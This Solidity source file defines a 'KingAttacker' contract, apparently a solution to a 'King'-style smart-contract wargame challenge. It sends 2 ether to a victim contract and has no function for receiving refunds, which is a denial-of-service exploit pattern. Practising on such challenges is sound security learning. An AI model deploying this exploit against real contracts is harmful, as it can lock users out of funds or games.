// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

contract KingAttacker {
    address victim;

    constructor(address _victimContract) public {
        victim = _victimContract;
    }

    function attack() external payable {
        (bool success, ) = victim.call{value: 2 ether}("");
        require(success, "TX error");
    }
}
